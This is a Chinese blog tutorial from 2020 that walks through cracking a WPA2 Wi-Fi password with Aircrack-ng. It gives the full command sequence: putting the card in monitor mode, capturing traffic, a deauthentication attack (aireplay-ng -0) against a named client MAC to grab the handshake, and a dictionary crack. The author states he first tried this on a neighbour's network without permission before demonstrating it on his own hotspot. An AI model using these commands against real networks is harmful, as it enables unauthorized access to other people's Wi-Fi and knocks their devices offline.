---
title: 使用Aircrack-ng破解WPA2加密的wifi密码
date: 2020-02-11 18:59:04
tags: [linux]
---

## 写在前面
现在是 2020 年 2 月 11 日，正是武汉病毒的爆发期间，全面禁止出门
今天才 11 号，手机流量早已经限速，完全没法使用了，我可以不出门，但不能没有网
所以，打算破解看看邻居家的 wifi 密码，可惜邻居家的 wifi 密码太复杂，使用我的密码字典没有跑出来
但是方法是没问题的，下面就以我自己手机开出的热点为目标 wifi 来攻击一下，记录一下这个过程

## 开工
打开一篇以前收藏的[文章](https://www.cnblogs.com/york-hust/archive/2012/07/07/2580340.html)

### 更新 Aircrack-ng
```
airodump-ng-oui-update
```

### 打开无线网卡
```
sudo ifconfig wlp3s0 up
```

### 激活无线网卡为监听模式
```
sudo airmon-ng start wlp3s0
```

### 探测无线网络，抓取无线数据包
```
sudo airodump-ng wlp3s0mon
```

探测结果大概是这样的
![](https://static.ifthat.com/public/data/51eaa6989f2bacea-2020-02-11_18-02.png)
找到目标 wifi 的chanal，这里我破解的是 honor 7X， ch 为 11  
![](https://static.ifthat.com/public/data/be6de0a4075ca775-2020-02-11_18-11.png)
```
sudo airodump-ng -c 11 -w longas wlp3s0mon
```
-c channel 
-w 保存文文件的前缀

### 找到 两台正在使用的 MAC

![](https://static.ifthat.com/public/data/6ea0d974ded680e1-2020-02-11_18-14.png)
执行上面命令的终端不要关，下面另开一个终端

### 攻击
```
sudo aireplay-ng -0 5 -a F0:0F:EC:6E:A8:AB -c 4C:6B:E8:B2:50:4C wlp3s0mon
```
-a 目标mac 
-c 客户端mac

刚才那个 终端出现这样的提示表示攻击成功,可以关闭这个终端了
![](https://static.ifthat.com/public/data/3534a3929bff257d-2020-02-11_18-21.png)
当前文件夹会出现这个文件
![](https://static.ifthat.com/public/data/d2abef363c1a50ab-2020-02-11_18-21_1.png)

### 使用字典破解
```
sudo aircrack-ng -w /mnt/windows-source/Data/破解字典/弱口令集/wordlist.txt longas-01.cap
```
-w 字典文件
![](https://static.ifthat.com/public/data/1784f82430b9c5eb-2020-02-11_18-23.png)
这里选择4

### 破解成功

![](https://static.ifthat.com/public/data/c9f6b9d8a0df4f98-2020-02-11_18-24_1.png)

### 最后停止无线网卡监听
```
sudo airmon-ng stop wlp3s0mon
```

## 参考资源
https://www.cnblogs.com/york-hust/archive/2012/07/07/2580340.html
